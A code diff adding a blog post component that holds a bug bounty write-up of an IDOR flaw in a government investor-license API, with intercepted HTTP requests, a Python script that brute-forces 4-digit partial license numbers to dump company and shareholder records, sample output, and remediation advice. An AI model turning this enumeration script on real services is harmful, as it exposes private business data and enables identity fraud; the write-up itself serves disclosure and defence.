@@ -731,6 +731,543 @@ if __name__ == "__main__":
   )
 }
 
+/* ─── License IDOR Post ─────────────────────────────── */
+function IDORLicensePost() {
+  return (
+    <div className="text-gray-400 text-sm leading-relaxed">
+
+      {/* ── Overview ─────────────────────────────── */}
+      <div className="glass-card p-5 sm:p-6 mb-8 border-l-4 border-orange-500">
+        <h3 className="font-mono font-bold text-white text-base mb-3 flex items-center gap-2">
+          <AlertTriangle className="w-4 h-4 text-orange-400" /> Executive Summary
+        </h3>
+        <P>
+          During a bug bounty engagement on a government investment platform, I identified a{' '}
+          <span className="text-orange-400 font-semibold">High-severity IDOR vulnerability</span>{' '}
+          in the investor license verification API. The endpoint accepted{' '}
+          <span className="text-orange-400 font-semibold">partial input — as few as 4 digits</span>{' '}
+          instead of the required full 12-digit Mi-license number, and returned complete company
+          and shareholder records with no authorization check. By iterating all 10,000 four-digit
+          combinations (<IC>0000</IC>–<IC>9999</IC>), an authenticated attacker could enumerate
+          the entire investor database in minutes.
+        </P>
+        <div className="grid grid-cols-2 sm:grid-cols-4 gap-3 mt-4">
+          {[
+            { label: 'Severity', value: 'High',       color: '#f97316' },
+            { label: 'Type',     value: 'IDOR',        color: '#00ff88' },
+            { label: 'Platform', value: 'Bug Bounty',  color: '#00cfff' },
+            { label: 'Bounty',   value: 'SAR 5,651',   color: '#10b981' },
+          ].map(({ label, value, color }) => (
+            <div key={label} className="bg-cyber-bg/60 rounded-lg p-3 border border-cyber-border/40">
+              <p className="font-mono text-xs text-gray-600 mb-1">{label}</p>
+              <p className="font-mono text-xs font-bold" style={{ color }}>{value}</p>
+            </div>
+          ))}
+        </div>
+        <div className="mt-3 px-3 py-2 rounded-lg bg-orange-500/5 border border-orange-500/20 font-mono text-xs text-orange-400/80">
+          ⚡ Marked as duplicate — another researcher submitted the same finding earlier.
+          The program rewarded the report regardless due to quality of documentation.
+        </div>
+      </div>
+
+      {/* ── Step 1 ───────────────────────────────── */}
+      <H2>Step 1 — Reconnaissance &amp; Application Mapping</H2>
+      <P>
+        The target was a government-operated investment platform used by foreign investors to register
+        companies, manage industrial facilities, and verify business licenses issued by the relevant
+        national authority. The platform enforces an onboarding flow before an investor can perform
+        any privileged actions: they must link a valid Mi-license number to their account.
+      </P>
+      <P>
+        After registering as a foreign investor and logging in, I was redirected to a profile
+        completion screen with a single call-to-action — <IC>Complete Profile</IC>. Clicking it
+        opened a modal with one input field: the investor's 12-digit Mi-license number. The UI
+        presented this as a strict validation step before proceeding to facility management.
+      </P>
+
+      <Callout type="info" title="What Is an Mi-License?">
+        An Mi-license (Investor License) is a government-issued identifier assigned to registered
+        foreign investors and companies. It authorizes specific commercial activities, facility
+        management, and product imports. The format is a{' '}
+        <IC>12-digit number</IC> followed by a branch suffix — e.g.{' '}
+        <IC>111030031212-01</IC>. Investors need this number to operate on the platform; it
+        serves as the primary business identity credential.
+      </Callout>
+
+      <P>
+        My first move was to intercept this form submission in Burp Suite to understand the
+        underlying API call: which endpoint handled verification, how the license number was
+        transmitted, and whether any server-side access control tied the response to the
+        requesting user's account.
+      </P>
+
+      {/* ── Step 2 ───────────────────────────────── */}
+      <H2>Step 2 — Intercepting the Verification Request</H2>
+      <P>
+        With Burp Suite running as the browser proxy, I entered a random 12-digit number in
+        the modal and captured the outgoing request. The application issued a plain{' '}
+        <IC>GET</IC> request with the license number embedded directly in the URL path:
+      </P>
+
+      <HttpBox
+        label="Normal Request — Full 12-Digit License Lookup"
+        type="request"
+        content={`GET /v2.0/en/public/profilemanagement/api/app/mi/121331432121?api-version=2.0 HTTP/1.1
+Host: api.example.com
+Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9...
+Accept: application/json, text/plain, */*
+X-Requested-With: XMLHttpRequest
+Origin: https://profile.example.com
+Referer: https://profile.example.com/
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36`}
+      />
+
+      <P>
+        The API returned <IC>404 Not Found</IC> for my invented number — the expected behavior.
+        However, several design choices stood out immediately:
+      </P>
+      <ul className="space-y-2 mb-5 ml-2">
+        {[
+          'The license number was a bare path segment — no hashing, signing, or obfuscation.',
+          'The only security layer was the Authorization header (a JWT for any valid account).',
+          'The endpoint was marked public in the path (/public/profilemanagement) — suggesting it may not enforce ownership checks.',
+          'No CSRF token or per-request nonce was required.',
+        ].map((item, i) => (
+          <li key={i} className="flex items-start gap-2 text-sm text-gray-400">
+            <span className="text-orange-400 mt-1 flex-shrink-0">→</span>
+            <span>{item}</span>
+          </li>
+        ))}
+      </ul>
+      <P>
+        The combination of a public endpoint, path-parameter-based lookup, and no apparent
+        ownership verification prompted me to test whether the backend performed an{' '}
+        <span className="text-cyber-blue font-semibold">exact match</span> or a{' '}
+        <span className="text-cyber-blue font-semibold">partial / substring match</span> on
+        the license number.
+      </P>
+
+      {/* ── Step 3 ───────────────────────────────── */}
+      <H2>Step 3 — Exploiting Partial Input Acceptance</H2>
+      <P>
+        In Burp Repeater, I replaced the full 12-digit number with just{' '}
+        <IC>1111</IC> — four digits. The response was not a 404.
+        It was a <IC>200 OK</IC> with a full company record:
+      </P>
+
+      <HttpBox
+        label="Modified Request — 4-Digit Partial Input"
+        type="request"
+        content={`GET /v2.0/en/public/profilemanagement/api/app/mi/1111?api-version=2.0 HTTP/1.1
+Host: api.example.com
+Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9...
+Accept: application/json, text/plain, */*
+X-Requested-With: XMLHttpRequest
+Origin: https://profile.example.com
+Referer: https://profile.example.com/`}
+      />
+
+      <HttpBox
+        label="Server Response — 200 OK (Full Record Returned)"
+        type="response"
+        content={`HTTP/2 200 OK
+Content-Type: application/json
+
+{
+  "licenseNumber":     "111030031212-01",
+  "licenseStatus":     "Active",
+  "licenseIssueDate":  "2002-11-23",
+  "licenseExpiryDate": "2026-08-10",
+  "licenseType":       "ISIC/Regular Investment Registration",
+  "licenseProducts": [
+    { "productID": "39232100", "productName": "[REDACTED]", "quantity": "3000.000", "unit": "001" },
+    { "productID": "39151000", "productName": "[REDACTED]", "quantity": "2000.000", "unit": "001" }
+  ],
+  "company": {
+    "companyID":          "[REDACTED]",
+    "companyName":        "[REDACTED]",
+    "companyCapital":     "9200000",
+    "companyLaborSize":   "75",
+    "companyLegalStatus": "Individual LLC",
+    "companyAddress": {
+      "addressLine1": "[REDACTED]",
+      "country":      "Saudi Arabia",
+      "city":         "[REDACTED]",
+      "zipCode":      "[REDACTED]"
+    },
+    "companyContact": {
+      "email":           "[REDACTED]@example.com",
+      "telephoneNumber": "XXXXXXXXXX",
+      "mobile":          "XXXXXXXXXX"
+    }
+  },
+  "companyShareholders": [
+    {
+      "shareholderID":         "[REDACTED]",
+      "shareholderName":       "[REDACTED]",
+      "ownershipPercentage":   "100.0000000",
+      "investedCapital":       "5000000.00"
+    }
+  ]
+}`}
+      />
+
+      <Callout type="danger" title="IDOR Confirmed — Zero Ownership Check">
+        Supplying only <IC>1111</IC> caused the server to return a complete company record.
+        The backend was performing a suffix or substring match rather than an exact lookup.
+        Critically, the authenticated JWT belonged to an entirely unrelated foreign investor
+        account — proving there was no server-side check tying the response to the
+        requesting user's ownership of that license.
+      </Callout>
+
+      <P>
+        The response revealed a compounding flaw: the <IC>licenseNumber</IC> field contained
+        the <span className="text-cyber-red font-semibold">full 12-digit identifier</span>{' '}
+        (<IC>111030031212-01</IC>). An attacker could therefore use a 4-digit guess to{' '}
+        <span className="text-cyber-red font-semibold">recover a valid complete license number</span>{' '}
+        they never legitimately possessed.
+      </P>
+
+      {/* ── Step 4 ───────────────────────────────── */}
+      <H2>Step 4 — Impact Chain: License Impersonation</H2>
+      <P>
+        The platform's profile completion flow accepts a Mi-license number and links it to the
+        investor's account — granting them facility management permissions under that license.
+        Once full license numbers are harvested via the IDOR, they can be fed back into this
+        same flow to <span className="text-cyber-red font-semibold">impersonate a legitimate company</span> on a government platform:
+      </P>
+      <div className="my-5 space-y-2">
+        {[
+          { n: '01', step: 'Enumerate license numbers via the IDOR endpoint (10,000 requests)', color: '#f97316' },
+          { n: '02', step: 'Identify an active license from a legitimate registered company',   color: '#f97316' },
+          { n: '03', step: 'Submit the stolen full license through the normal Complete Profile flow', color: '#facc15' },
+          { n: '04', step: 'Platform links the victim company\'s license to the attacker\'s account', color: '#facc15' },
+          { n: '05', step: 'Attacker gains facility management rights attributed to the victim company', color: '#ff4455' },
+        ].map(({ n, step, color }) => (
+          <div key={n} className="flex items-start gap-3 glass-card px-4 py-3">
+            <span className="font-mono text-xs font-bold flex-shrink-0 mt-0.5" style={{ color }}>{n}</span>
+            <span className="text-sm text-gray-400">{step}</span>
+          </div>
+        ))}
+      </div>
+
+      {/* ── Step 5 ───────────────────────────────── */}
+      <H2>Step 5 — Mass Enumeration</H2>
+      <P>
+        The critical amplifier is the search space. A full 12-digit license number has{' '}
+        10<sup>12</sup> (one trillion) possible values — brute-force is infeasible.
+        But the endpoint accepted 4-digit partial input, collapsing the effective search
+        space to just <span className="text-cyber-red font-semibold">10,000 combinations</span>{' '}
+        (<IC>0000</IC>–<IC>9999</IC>). At a conservative 3 requests/second with no rate
+        limiting, the entire space can be exhausted in under <span className="text-cyber-red font-semibold">56 minutes</span>.
+      </P>
+      <P>
+        I wrote the following proof-of-concept to demonstrate the scale. It generates random
+        4-digit strings, queries the endpoint, and prints full company records for any hit.
+      </P>
+
+      <CodeBlock language="python" filename="idor_license_enum.py" code={`#!/usr/bin/env python3
+"""
+IDOR Mass Enumeration PoC — License Verification Endpoint
+Target: GET /v2.0/en/public/profilemanagement/api/app/mi/<partial>
+Impact: Enumerate investor company records using 4-digit partial input
+
+IMPORTANT: This script was run under controlled bug bounty conditions
+with explicit program authorization. Unauthorized use is illegal.
+"""
+
+import requests
+import json
+import random
+import sys
+
+sys.stdout.reconfigure(encoding='utf-8')
+
+# ── Configuration ─────────────────────────────────────────
+USER_TOKEN = '<your-jwt-token>'           # Omit 'Bearer' prefix
+BASE_URL   = 'https://api.example.com'
+ENDPOINT   = '/v2.0/en/public/profilemanagement/api/app/mi/'
+
+counter = 0
+
+HEADERS = {
+    'Authorization':    f'Bearer {USER_TOKEN}',
+    'X-Requested-With': 'XMLHttpRequest',
+    'Accept':           'application/json, text/plain, */*',
+    'Accept-Language':  'en',
+    'User-Agent':       'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
+}
+
+
+# ── Helpers ───────────────────────────────────────────────
+def random_4digit() -> str:
+    """Return a zero-padded random 4-digit string (0000–9999)."""
+    return f"{random.randint(0, 9999):04d}"
+
+
+# ── Core ──────────────────────────────────────────────────
+def fetch_company(partial: str) -> None:
+    global counter
+
+    url  = f"{BASE_URL}{ENDPOINT}{partial}?api-version=2.0"
+    resp = requests.get(url, headers=HEADERS, timeout=10)
+
+    if resp.status_code == 200:
+        data    = resp.json()
+        company = data.get('company', {})
+        contact = company.get('companyContact', {})
+        counter += 1
+
+        print(f"{'─'*52} [{counter}]")
+        print(f"  Full License : {data.get('licenseNumber')}")
+        print(f"  Status       : {data.get('licenseStatus')}")
+        print(f"  Type         : {data.get('licenseType')}")
+        print(f"  Issued       : {data.get('licenseIssueDate')}")
+        print(f"  Expires      : {data.get('licenseExpiryDate')}")
+        print(f"  Company      : {company.get('companyName')}")
+        print(f"  Capital      : SAR {company.get('companyCapital')}")
+        print(f"  Employees    : {company.get('companyLaborSize')}")
+        print(f"  Email        : {contact.get('email')}")
+        print(f"  Phone        : {contact.get('telephoneNumber')}")
+
+        shareholders = data.get('companyShareholders', [])
+        for sh in shareholders:
+            pct = sh.get('ownershipPercentage', '?')
+            print(f"  Shareholder  : {sh.get('shareholderName')} ({pct}%)")
+        print()
+
+    elif resp.status_code == 500:
+        print("[-] Bearer token expired or unauthorized — exiting.")
+        sys.exit(1)
+
+    else:
+        print(f"  [-] {partial} → no match (HTTP {resp.status_code})")
+
+
+# ── Entry point ───────────────────────────────────────────
+def main():
+    print("[*] IDOR Mass Enumeration — License Verification API")
+    print(f"[*] Endpoint : {BASE_URL}{ENDPOINT}<4-digit>")
+    print(f"[*] Space    : 0000–9999  (10,000 combinations)\\n")
+
+    try:
+        while True:
+            fetch_company(random_4digit())
+    except KeyboardInterrupt:
+        print(f"\\n[*] Halted by user — {counter} records collected.")
+
+
+if __name__ == '__main__':
+    main()`} />
+
+      <H3>PoC Output (Redacted)</H3>
+      <CodeBlock language="bash" filename="enum_output.txt" code={`[*] IDOR Mass Enumeration — License Verification API
+[*] Endpoint : https://api.example.com/v2.0/en/public/profilemanagement/api/app/mi/<4-digit>
+[*] Space    : 0000–9999  (10,000 combinations)
+
+  [-] 4821 → no match (HTTP 404)
+  [-] 7263 → no match (HTTP 404)
+──────────────────────────────────────────────── [198]
+  Full License : 2030062723-01
+  Status       : Active
+  Type         : ISIC/Regular Investment Registration
+  Issued       : 2006-06-17
+  Expires      : 2026-10-03
+  Company      : [REDACTED]
+  Capital      : SAR [REDACTED]
+  Employees    : [REDACTED]
+  Email        : [REDACTED]@example.com
+  Phone        : XXXXXXXXXX
+  Shareholder  : [REDACTED] (100.0%)
+
+  [-] 0793 → no match (HTTP 404)
+──────────────────────────────────────────────── [199]
+  Full License : 102030083682-01
+  Status       : Active
+  Type         : ISIC/Regular Investment Registration
+  Issued       : 2009-01-03
+  Expires      : 2026-06-05
+  Company      : [REDACTED]
+  Capital      : SAR [REDACTED]
+  Employees    : [REDACTED]
+  Email        : [REDACTED]@example.com
+  Phone        : XXXXXXXXXX
+  Shareholder  : [REDACTED] (51.0%)
+  Shareholder  : [REDACTED] (49.0%)
+
+──────────────────────────────────────────────── [200]
+  Full License : 111030021352-01
+  Status       : Active
+  Type         : ISIC/Regular Investment Registration
+  Issued       : 2007-03-18
+  Expires      : 2026-07-26
+  Company      : [REDACTED]
+  Capital      : SAR [REDACTED]
+  Employees    : [REDACTED]
+  Email        : [REDACTED]@example.com
+  Phone        : XXXXXXXXXX
+  Shareholder  : [REDACTED] (100.0%)
+
+[*] Halted by user — 200 records collected.`} />
+
+      <Callout type="success" title="Reported — Duplicate, Rewarded">
+        After confirming the vulnerability with the minimum necessary evidence, I submitted a
+        full report including this writeup, Burp Suite HTTP transcripts, and the PoC script.
+        The program triaged the report as a{' '}
+        <span className="font-semibold">duplicate</span> — another researcher had submitted the
+        same finding days earlier — but issued a reward of{' '}
+        <span className="font-semibold text-emerald-400">SAR 5,651</span> in recognition of the
+        report quality and the independently-produced PoC.
+      </Callout>
+
+      {/* ── Impact ───────────────────────────────── */}
+      <H2>Impact Assessment</H2>
+      <div className="glass-card overflow-hidden my-5">
+        <div className="px-5 py-3 bg-orange-500/10 border-b border-orange-500/20 font-mono text-xs text-orange-400 font-semibold">
+          CVSS v3.1 Score: 7.1 HIGH — AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:L/A:N
+        </div>
+        <div className="p-5 space-y-3">
+          {[
+            { label: 'Attack Vector',       value: 'Network',    color: '#f97316' },
+            { label: 'Attack Complexity',   value: 'Low',        color: '#f97316' },
+            { label: 'Privileges Required', value: 'Low',        color: '#facc15' },
+            { label: 'User Interaction',    value: 'None',       color: '#f97316' },
+            { label: 'Scope',               value: 'Unchanged',  color: '#9ca3af' },
+            { label: 'Confidentiality',     value: 'High',       color: '#f97316' },
+            { label: 'Integrity',           value: 'Low',        color: '#facc15' },
+            { label: 'Availability',        value: 'None',       color: '#9ca3af' },
+          ].map(({ label, value, color }) => (
+            <div key={label} className="flex items-center justify-between py-1.5 border-b border-cyber-border/20 last:border-0">
+              <span className="font-mono text-xs text-gray-500">{label}</span>
+              <span className="font-mono text-xs font-bold" style={{ color }}>{value}</span>
+            </div>
+          ))}
+        </div>
+      </div>
+
+      <P>Confirmed impact of this vulnerability:</P>
+      <ul className="space-y-2 mb-6 ml-2">
+        {[
+          'Full license number disclosure — 4-digit partial input recovers the complete 12-digit identifier',
+          'Company name, legal status, capital, and employee count exposed at scale',
+          'Executive email addresses and direct phone numbers leaked for every matched record',
+          'Registered physical addresses disclosed, enabling targeted physical attacks',
+          'Shareholder identities — beneficial owner names, IDs, and capital stakes exposed',
+          'License impersonation — stolen identifiers can be used to fraudulently assume another company\'s identity on a government platform',
+          'Mass enumeration trivially achievable — 10,000 requests, completable in under one hour',
+        ].map((item, i) => (
+          <li key={i} className="flex items-start gap-2 text-sm text-gray-400">
+            <span className="text-orange-400 mt-1 flex-shrink-0">→</span>
+            <span>{item}</span>
+          </li>
+        ))}
+      </ul>
+
+      {/* ── Recommendations ──────────────────────── */}
+      <H2>Recommendations &amp; Remediation</H2>
+      <div className="space-y-3 mb-6">
+        {[
+          {
+            num: '01',
+            title: 'Enforce Exact Input Validation',
+            desc: 'Reject any input that does not match the full 12-digit license format before querying the database. Apply strict server-side regex (e.g. /^\\d{12}$/) — client-side validation alone is trivially bypassed via Burp Suite.',
+            priority: 'P0 — Immediate',
+            color: '#ff4455',
+          },
+          {
+            num: '02',
+            title: 'Replace Partial Matching with Exact Lookup',
+            desc: 'The database query must use strict equality (WHERE license_number = ?) rather than LIKE, CONTAINS, or suffix operators. Partial matching has no legitimate use case in license verification — a user either knows their full number or they do not.',
+            priority: 'P0 — Immediate',
+            color: '#ff4455',
+          },
+          {
+            num: '03',
+            title: 'Enforce Server-Side Authorization',
+            desc: 'Returning a license record must require proof of ownership. The authenticated user\'s session must be tied to the requested license before any data is returned. A valid JWT alone is authentication, not authorization over arbitrary records.',
+            priority: 'P1 — Short Term',
+            color: '#facc15',
+          },
+          {
+            num: '04',
+            title: 'Apply Rate Limiting & Anomaly Detection',
+            desc: 'Enforce strict per-token rate limits on this endpoint (e.g., 5 attempts per session). Flag and alert on high-frequency or sequential lookups — a legitimate user completing their own profile needs at most a handful of requests.',
+            priority: 'P2 — Medium Term',
+            color: '#00cfff',
+          },
+        ].map(({ num, title, desc, priority, color }) => (
+          <div key={num} className="glass-card p-4 flex gap-4">
+            <div className="font-mono text-2xl font-bold opacity-20 flex-shrink-0 w-8">{num}</div>
+            <div className="flex-1 min-w-0">
+              <div className="flex items-start justify-between gap-3 mb-1.5">
+                <h4 className="font-mono font-semibold text-white text-sm">{title}</h4>
+                <span className="font-mono text-xs px-2 py-0.5 rounded-full border flex-shrink-0" style={{ color, borderColor: color + '50', backgroundColor: color + '10' }}>
+                  <span className="sm:hidden">{priority.split(' — ')[0]}</span>
+                  <span className="hidden sm:inline">{priority}</span>
+                </span>
+              </div>
+              <p className="text-xs text-gray-500 leading-relaxed">{desc}</p>
+            </div>
+          </div>
+        ))}
+      </div>
+
+      {/* ── Timeline ─────────────────────────────── */}
+      <H2>Disclosure Timeline</H2>
+      <div className="glass-card overflow-hidden my-5">
+        {[
+          { date: 'Day 1', event: 'License verification endpoint identified during normal app onboarding flow', color: 'text-gray-400' },
+          { date: 'Day 1', event: 'Partial input (4 digits) confirmed to return full company records via Burp Repeater', color: 'text-cyber-blue' },
+          { date: 'Day 1', event: 'License impersonation vector confirmed — full number recovered from response', color: 'text-cyber-red' },
+          { date: 'Day 1', event: 'PoC enumeration script written — 200 records collected in demonstration', color: 'text-cyber-red' },
+          { date: 'Day 1', event: 'Full report submitted to the bug bounty program with writeup, HTTP transcripts, and PoC', color: 'text-cyber-green' },
+          { date: 'Day 4', event: 'Program acknowledged receipt and began triage', color: 'text-gray-400' },
+          { date: 'Day 9', event: 'Report marked as Duplicate — earlier submission by another researcher confirmed', color: 'text-yellow-400' },
+          { date: 'Day 9', event: 'Reward of SAR 5,651 issued in recognition of independent discovery and documentation quality', color: 'text-cyber-green' },
+        ].map(({ date, event, color }, i) => (
+          <div key={i} className="flex items-start gap-4 px-5 py-3 border-b border-cyber-border/20 last:border-0 hover:bg-cyber-bg/30 transition-colors">
+            <span className="font-mono text-xs text-gray-600 w-12 flex-shrink-0">{date}</span>
+            <span className={`font-mono text-xs ${color}`}>{event}</span>
+          </div>
+        ))}
+      </div>
+
+      {/* ── Conclusion ───────────────────────────── */}
+      <H2>Conclusion</H2>
+      <P>
+        This vulnerability is a textbook case of conflating input format with input validation.
+        The platform's designers likely assumed that a 12-digit license number would be difficult
+        to guess — effectively treating it as a secret. But the backend's partial-match behavior
+        collapsed the search space from one trillion to just ten thousand values, making
+        brute-force entirely practical.
+      </P>
+      <P>
+        The most serious risk is not the data exposure in isolation but the{' '}
+        <span className="text-orange-400 font-semibold">license impersonation chain</span>:
+        because the response includes the full valid identifier, an attacker can immediately
+        recycle stolen license numbers to fraudulently assume the identity of registered
+        companies on a government platform — with real legal and commercial consequences.
+      </P>
+      <P>
+        The duplicate status is also a useful reminder: on high-value programs, common
+        vulnerability classes are routinely found by multiple researchers in parallel. Speed
+        of reporting matters, but clear documentation, a working PoC, and a well-scoped
+        impact analysis remain rewarded even as duplicates — and make a stronger case for
+        appropriate severity classification.
+      </P>
+
+      <Callout type="info" title="Tools Used in This Assessment">
+        <span className="flex flex-wrap gap-2 mt-1">
+          {['Burp Suite', 'Burp Repeater', 'Python 3', 'requests', 'Browser DevTools'].map(t => (
+            <IC key={t}>{t}</IC>
+          ))}
+        </span>
+      </Callout>
+
+    </div>
+  )
+}
+
 /* ─── Severity badge styles ─────────────────────────── */
 const SEVERITY_STYLES = {
   Critical: 'bg-cyber-red/10 text-cyber-red border-cyber-red/30',
@@ -740,7 +1277,8 @@ const SEVERITY_STYLES = {
 
 /* ─── Post router ───────────────────────────────────── */
 function PostContent({ slug }) {
-  if (slug === 'mass-idor-citizen-data-leak') return <IDORPost />
+  if (slug === 'mass-idor-citizen-data-leak')   return <IDORPost />
+  if (slug === 'idor-license-api-enumeration')  return <IDORLicensePost />
   return (
     <div className="text-center py-16 text-gray-600 font-mono text-sm">
       <Shield className="w-10 h-10 mx-auto mb-3 opacity-30" />
@@ -785,6 +1323,11 @@ export default function BlogPost() {
             {post.platform && (
               <span className="tag tag-blue">
                 <Bug className="w-2.5 h-2.5 mr-0.5" />{post.platform}
+              </span>
+            )}
+            {post.bounty && (
+              <span className="tag bg-emerald-500/10 text-emerald-400 border-emerald-500/30">
+                <DollarSign className="w-2.5 h-2.5 mr-0.5" />{post.bounty}
               </span>
             )}
           </div>
